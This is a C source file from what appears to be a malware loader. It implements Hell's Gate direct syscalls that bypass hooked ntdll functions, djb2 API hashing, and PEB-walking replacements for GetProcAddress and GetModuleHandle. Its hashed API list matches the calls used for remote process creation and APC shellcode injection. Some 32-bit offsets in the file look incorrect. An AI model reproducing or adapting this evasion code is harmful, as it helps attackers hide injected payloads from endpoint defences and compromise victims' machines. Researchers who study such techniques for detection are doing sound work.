#include "header.h"

// Hells Gate functions
PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x92351f259ecd12a;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}

VOID PrintHashes() {

	PCHAR Apis[] = {
		"ntdll.dll",
		"RtlCreateProcessParametersEx",
		"NtCreateUserProcess",
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtProtectVirtualMemory",
		"NtQueueApcThread", 
		"NtResumeThread",
		"NtClose"
	};

	// Hash definitions
	for (INT i = 0; i < sizeof(Apis) / sizeof(Apis[0]); i++) {
		printf("#define %s_HASH 0x%p\n", Apis[i], djb2(Apis[i]));
	}

	printf("\n");

	// Hell's Gate table initialization
	for (INT i = 0; i < sizeof(Apis) / sizeof(Apis[0]); i++) {
		printf("Table->%s.dwHash = %s_HASH; \nif (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table->%s)) {\n\tPRINT_ERROR(\"GetVxTableEntry [%s]\");\n\treturn FALSE;\n}\n\n", Apis[i], Apis[i], Apis[i], Apis[i]);
	}
}

VOID RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

	if ((UsStruct->Buffer = (PWSTR)Buffer)) {

		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
		if (Length > 0xfffc)
			Length = 0xfffc;

		UsStruct->Length = Length;
		UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
	}

	else UsStruct->Length = UsStruct->MaximumLength = 0;
}

/// Custom GetProcAddress 
FARPROC GetProcAddressH(IN HMODULE hModule, IN DWORD64 dwApiNameHash) {

	if (!hModule || !dwApiNameHash) return NULL;

	PBYTE pBase = (PBYTE)hModule;

	// Get DOS Header
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}

	// Get NT Headers
	PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
		return NULL;
	}

	// Get Optional Header
	IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdr->OptionalHeader;
	if (ImgOptHdr.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) {
		return NULL;
	}

	// Get pointer to the Export Table structure
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// Get relevant information from the export directory to search for a specific function
	PDWORD FnNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);			// function names
	PDWORD FnAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);  // function addresses
	PWORD FnOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals); // function ordinals

	// Loop over exported functions 
	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

		// Get name of the function 
		CHAR* pFnName = (CHAR*)(pBase + FnNameArray[i]); // Name
		WORD wFnOrdinal = FnOrdinalArray[i]; // Ordinal
		PVOID pFnAddress = (PVOID)(pBase + FnAddressArray[wFnOrdinal]); // Address

		// Search for the function that matches the hash and return it
		if (djb2(pFnName) == dwApiNameHash) {
			return pFnAddress;
		}
	}

	WARN("Function for hash 0x%X not found.", dwApiNameHash);
	return NULL;
}

/// Custom GetModuleHandle
HMODULE GetModuleHandleH(IN DWORD64 dwModuleNameHash) {

	if (!dwModuleNameHash) return NULL;

	PPEB pPeb = NULL;

	// Use to __readgsqword macro to get the address of the PPEB by specifying the offset of 0x60 (0x30 on 32-bit systems, since PVOID has a since of 4 on there.
#ifdef _WIN64
	pPeb = __readgsqword(0x60); // sizeof(PVOID) = 8 --[ * 12 ]--> 96 --[ HEX ]--> 0x60
#elif _WIN32
	pPeb = __readgsqword(0x30); // sizeof(PVOID) = 4 --> [ * 12 ] = 48 --[ HEX ]-- 0x30
#endif 

	// Get PED_LDR_DATA structure
	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->LoaderData);

	// Get first element of the linked list which contains information about the first module
	// Doubly-linked lists use the Flink and Blink elements as the head and tail pointers, respectively. 
	// This means Flink points to the next node in the list whereas the Blink element points to the previous node in the list. 
	PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	// Loop over all modules
	while (pDte) {

		if (pDte->FullDllName.Length == NULL || pDte->FullDllName.Length > MAX_PATH) {
			break;
		}

		// Convert FullDllName.Buffer to lowercase string
		CHAR szLowercaseDllName[MAX_PATH];

		DWORD i = 0;
		for (i = 0; i < pDte->FullDllName.Length; i++) {
			szLowercaseDllName[i] = (CHAR)tolower(pDte->FullDllName.Buffer[i]);
		}
		szLowercaseDllName[i] = '\0';

		// Check if hashes match
		if (djb2(szLowercaseDllName) == dwModuleNameHash) {
			// The DLL base address is InInitializationOrderLinks.Flink, or Reserved2[0]
			// If the undocumented structs are not present, the next line could also be written as the following
			// return (HMODULE)(pDte->Reserved2[0]
			HANDLE hModule = (HMODULE)pDte->InInitializationOrderLinks.Flink; 
			return hModule;
		}

		// Move to the next element in the linked list
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}

	return NULL;
}